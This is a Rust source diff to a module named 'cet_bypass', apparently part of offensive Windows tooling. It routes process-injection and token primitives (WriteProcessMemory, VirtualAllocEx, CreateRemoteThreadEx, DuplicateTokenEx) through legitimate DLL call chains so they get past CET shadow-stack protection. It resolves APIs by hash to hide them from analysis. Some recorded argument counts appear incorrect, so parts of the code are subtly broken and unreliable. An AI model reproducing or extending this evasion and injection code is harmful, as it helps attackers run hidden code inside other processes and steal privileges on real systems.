@@ -51,7 +51,7 @@ use winapi::um::winnt::{
     ProcessControlFlowGuardPolicy,
 };
 use winapi::shared::ntdef::{PVOID, HANDLE};
-use winapi::shared::minwindef::{DWORD, BOOL};
+use winapi::shared::minwindef::{DWORD, BOOL, LONG};
 use winapi::shared::basetsd::SIZE_T;
 
 // ─── Constants ────────────────────────────────────────────────────────────
@@ -66,7 +66,9 @@ const CET_ENABLED_CANNOT_DISABLE: u8 = 2;
 /// NTSTATUS success.
 const STATUS_SUCCESS: i32 = 0;
 /// NTSTATUS for STATUS_ACCESS_DENIED.
-const STATUS_ACCESS_DENIED: i32 = 0xC000002D_u32 as i32;
+const STATUS_ACCESS_DENIED: i32 = 0xC0000022_u32 as i32;
+/// NTSTATUS for STATUS_NOT_SUPPORTED.
+const STATUS_NOT_SUPPORTED: i32 = 0xC00000BB_u32 as i32;
 /// NTSTATUS for STATUS_INVALID_INFO_CLASS.
 const STATUS_INVALID_INFO_CLASS: i32 = 0xC0000003_u32 as i32;
 /// NTSTATUS for STATUS_INVALID_PARAMETER.
@@ -79,8 +81,6 @@ const STATUS_CONTROL_STACK_VIOLATION: DWORD = 0xC00001A7;
 const EXCEPTION_CONTINUE_EXECUTION: LONG = -1;
 /// VEH handler return: continue search.
 const EXCEPTION_CONTINUE_SEARCH: LONG = 0;
-
-type LONG = i32;
 
 // ─── Global State ─────────────────────────────────────────────────────────
 
@@ -549,6 +549,9 @@ pub struct CallChainStep {
     pub func_name: &'static str,
     /// Whether this function ultimately calls the target NT API.
     pub reaches_target: bool,
+    /// Number of arguments the kernel32 wrapper expects.
+    /// Used to select the correct transmute signature.
+    pub arg_count: usize,
 }
 
 /// Pre-built call chains for common NT API targets.
@@ -556,87 +559,122 @@ pub struct CallChainStep {
 /// These chains route through legitimate kernel32/ntdll functions so that
 /// each `call` instruction pushes a valid shadow-stack entry.  The final
 /// call in the chain reaches the target NT API through normal call flow.
+///
+/// Each `CallChainStep` records the expected argument count so that
+/// `call_via_chain` can dispatch through the correct function-pointer
+/// signature.
 pub static CALL_CHAINS: once_cell::sync::Lazy<std::collections::HashMap<&'static str, Vec<CallChainStep>>> =
     once_cell::sync::Lazy::new(|| {
         let mut m = std::collections::HashMap::new();
 
-        // NtWriteVirtualMemory ← kernel32!WriteProcessMemory ← ntdll!NtWriteVirtualMemory
+        // NtWriteVirtualMemory ← kernel32!WriteProcessMemory (5 args)
         m.insert(
             "NtWriteVirtualMemory",
             vec![CallChainStep {
                 dll_name: "kernel32.dll",
                 func_name: "WriteProcessMemory",
                 reaches_target: true,
+                arg_count: 5,
             }],
         );
 
-        // NtReadVirtualMemory ← kernel32!ReadProcessMemory
+        // NtReadVirtualMemory ← kernel32!ReadProcessMemory (5 args)
         m.insert(
             "NtReadVirtualMemory",
             vec![CallChainStep {
                 dll_name: "kernel32.dll",
                 func_name: "ReadProcessMemory",
                 reaches_target: true,
+                arg_count: 5,
             }],
         );
 
-        // NtAllocateVirtualMemory ← kernel32!VirtualAllocEx
+        // NtAllocateVirtualMemory ← kernel32!VirtualAllocEx (5 args)
         m.insert(
             "NtAllocateVirtualMemory",
             vec![CallChainStep {
                 dll_name: "kernel32.dll",
                 func_name: "VirtualAllocEx",
                 reaches_target: true,
+                arg_count: 5,
             }],
         );
 
-        // NtFreeVirtualMemory ← kernel32!VirtualFreeEx
+        // NtFreeVirtualMemory ← kernel32!VirtualFreeEx (4 args)
         m.insert(
             "NtFreeVirtualMemory",
             vec![CallChainStep {
                 dll_name: "kernel32.dll",
                 func_name: "VirtualFreeEx",
                 reaches_target: true,
+                arg_count: 4,
             }],
         );
 
-        // NtProtectVirtualMemory ← kernel32!VirtualProtectEx
+        // NtProtectVirtualMemory ← kernel32!VirtualProtectEx (5 args)
         m.insert(
             "NtProtectVirtualMemory",
             vec![CallChainStep {
                 dll_name: "kernel32.dll",
                 func_name: "VirtualProtectEx",
                 reaches_target: true,
+                arg_count: 5,
             }],
         );
 
-        // NtOpenProcess ← kernel32!OpenProcess
+        // NtOpenProcess ← kernel32!OpenProcess (3 args)
         m.insert(
             "NtOpenProcess",
             vec![CallChainStep {
                 dll_name: "kernel32.dll",
                 func_name: "OpenProcess",
                 reaches_target: true,
+                arg_count: 3,
             }],
         );
 
-        // NtClose ← kernel32!CloseHandle
+        // NtClose ← kernel32!CloseHandle (1 arg)
         m.insert(
             "NtClose",
             vec![CallChainStep {
                 dll_name: "kernel32.dll",
                 func_name: "CloseHandle",
                 reaches_target: true,
+                arg_count: 1,
             }],
         );
 
-        // NtQueryVirtualMemory ← kernel32!VirtualQueryEx
+        // NtQueryVirtualMemory ← kernel32!VirtualQueryEx (4 args)
         m.insert(
             "NtQueryVirtualMemory",
             vec![CallChainStep {
                 dll_name: "kernel32.dll",
                 func_name: "VirtualQueryEx",
                 reaches_target: true,
+                arg_count: 4,
+            }],
+        );
+
+        // NtCreateThreadEx ← kernel32!CreateRemoteThreadEx (6 args for
+        // the first 6 of 9+ params we actually forward)
+        m.insert(
+            "NtCreateThreadEx",
+            vec![CallChainStep {
+                dll_name: "kernel32.dll",
+                func_name: "CreateRemoteThreadEx",
+                reaches_target: true,
+                arg_count: 6,
+            }],
+        );
+
+        // NtDuplicateToken ← advapi32!DuplicateTokenEx (5 args)
+        m.insert(
+            "NtDuplicateToken",
+            vec![CallChainStep {
+                dll_name: "advapi32.dll",
+                func_name: "DuplicateTokenEx",
+                reaches_target: true,
+                arg_count: 5,
             }],
         );
 
@@ -650,17 +688,15 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<std::collections::HashMap<&'static
 /// a legitimate call chain.  Each `call` instruction in the chain pushes a
 /// valid entry onto both the regular and shadow stacks.
 ///
+/// The function resolves the target API address via `pe_resolve` hash-based
+/// lookup (no dependency on the clean-DLL mapping infrastructure) and
+/// dispatches through a variable-argument match on `step.arg_count` to
+/// avoid truncating arguments for APIs with > 4 parameters.
+///
 /// Returns `Some(NTSTATUS)` on success, `None` if no call chain is available
 /// for the given function.
 pub fn call_via_chain(func_name: &str, args: &[u64]) -> Option<i32> {
     let chain = CALL_CHAINS.get(func_name)?;
-
-    // For now, we delegate to the syscall_emulation layer if available,
-    // or directly call the kernel32 API.
-    //
-    // The call chain is effectively: our code → kernel32!WriteProcessMemory
-    // → ntdll!NtWriteVirtualMemory → syscall.  Each `call` pushes a valid
-    // shadow-stack entry.
 
     if chain.len() != 1 {
         log::warn!("cet_bypass: multi-step call chains not yet supported for {}", func_name);
@@ -669,15 +705,32 @@ pub fn call_via_chain(func_name: &str, args: &[u64]) -> Option<i32> {
 
     let step = &chain[0];
 
-    // Resolve the kernel32 function address.
-    let func_addr = match crate::syscalls::get_clean_api_addr(step.dll_name, step.func_name) {
-        Ok(addr) => addr,
-        Err(e) => {
+    // Resolve the DLL base and function address via pe_resolve hash-based
+    // lookup.  This avoids depending on the clean-DLL mapping in syscalls
+    // and works purely from the PEB loader data of already-loaded modules.
+    let dll_hash = pe_resolve::hash_wstr(
+        &step.dll_name.encode_utf16().collect::<Vec<u16>>(),
+    );
+    let func_hash = pe_resolve::hash_str(step.func_name.as_bytes());
+
+    let dll_base = match unsafe { pe_resolve::get_module_handle_by_hash(dll_hash) } {
+        Some(b) => b,
+        None => {
             log::warn!(
-                "cet_bypass: could not resolve {}!{}: {}",
+                "cet_bypass: could not resolve module {} by hash",
+                step.dll_name,
+            );
+            return None;
+        }
+    };
+
+    let func_addr = match unsafe { pe_resolve::get_proc_address_by_hash(dll_base, func_hash) } {
+        Some(a) => a,
+        None => {
+            log::warn!(
+                "cet_bypass: could not resolve {}!{} by hash",
                 step.dll_name,
                 step.func_name,
-                e,
             );
             return None;
         }
@@ -692,20 +745,78 @@ pub fn call_via_chain(func_name: &str, args: &[u64]) -> Option<i32> {
     // Note: We use a raw function-pointer call (not spoof_call) because
     // CET shadow stacks require legitimate `call` instructions.  spoof_call
     // manipulates the return address, which breaks shadow-stack integrity.
-
-    let arg1 = args.get(0).copied().unwrap_or(0);
-    let arg2 = args.get(1).copied().unwrap_or(0);
-    let arg3 = args.get(2).copied().unwrap_or(0);
-    let arg4 = args.get(3).copied().unwrap_or(0);
+    //
+    // Variable-argument dispatch: we transmute to the correct arity based
+    // on the recorded arg_count so that 5-arg and 6-arg APIs (e.g.
+    // VirtualProtectEx, CreateRemoteThreadEx) are not truncated.
 
     let result = unsafe {
-        // Type-erased function pointer call.  We pass the first 4 args
-        // via registers (Windows x64 ABI: rcx, rdx, r8, r9).  Extra args
-        // would need to go on the stack, but all our kernel32 equivalents
-        // take ≤ 4 args.
-        let func: unsafe extern "system" fn(u64, u64, u64, u64) -> i32 =
-            std::mem::transmute(func_addr);
-        func(arg1, arg2, arg3, arg4)
+        match step.arg_count {
+            1 => {
+                let func: unsafe extern "system" fn(u64) -> i32 =
+                    std::mem::transmute(func_addr);
+                func(args.get(0).copied().unwrap_or(0))
+            }
+            2 => {
+                let func: unsafe extern "system" fn(u64, u64) -> i32 =
+                    std::mem::transmute(func_addr);
+                func(
+                    args.get(0).copied().unwrap_or(0),
+                    args.get(1).copied().unwrap_or(0),
+                )
+            }
+            3 => {
+                let func: unsafe extern "system" fn(u64, u64, u64) -> i32 =
+                    std::mem::transmute(func_addr);
+                func(
+                    args.get(0).copied().unwrap_or(0),
+                    args.get(1).copied().unwrap_or(0),
+                    args.get(2).copied().unwrap_or(0),
+                )
+            }
+            4 => {
+                let func: unsafe extern "system" fn(u64, u64, u64, u64) -> i32 =
+                    std::mem::transmute(func_addr);
+                func(
+                    args.get(0).copied().unwrap_or(0),
+                    args.get(1).copied().unwrap_or(0),
+                    args.get(2).copied().unwrap_or(0),
+                    args.get(3).copied().unwrap_or(0),
+                )
+            }
+            5 => {
+                let func: unsafe extern "system" fn(u64, u64, u64, u64, u64) -> i32 =
+                    std::mem::transmute(func_addr);
+                func(
+                    args.get(0).copied().unwrap_or(0),
+                    args.get(1).copied().unwrap_or(0),
+                    args.get(2).copied().unwrap_or(0),
+                    args.get(3).copied().unwrap_or(0),
+                    args.get(4).copied().unwrap_or(0),
+                )
+            }
+            6 => {
+                let func: unsafe extern "system" fn(u64, u64, u64, u64, u64, u64) -> i32 =
+                    std::mem::transmute(func_addr);
+                func(
+                    args.get(0).copied().unwrap_or(0),
+                    args.get(1).copied().unwrap_or(0),
+                    args.get(2).copied().unwrap_or(0),
+                    args.get(3).copied().unwrap_or(0),
+                    args.get(4).copied().unwrap_or(0),
+                    args.get(5).copied().unwrap_or(0),
+                )
+            }
+            n => {
+                log::warn!(
+                    "cet_bypass: unsupported arg_count {} for {}!{}",
+                    n,
+                    step.dll_name,
+                    step.func_name,
+                );
+                return None;
+            }
+        }
     };
 
     Some(result)
@@ -862,7 +973,9 @@ mod tests {
     #[test]
     fn test_has_call_chain() {
         assert!(has_call_chain("NtWriteVirtualMemory"));
-        assert!(!has_call_chain("NtCreateThreadEx")); // No chain registered
+        assert!(has_call_chain("NtCreateThreadEx")); // Chain via CreateRemoteThreadEx
+        assert!(has_call_chain("NtDuplicateToken")); // Chain via DuplicateTokenEx
+        assert!(!has_call_chain("NtCreateFile")); // No chain registered
     }
 
     #[test]
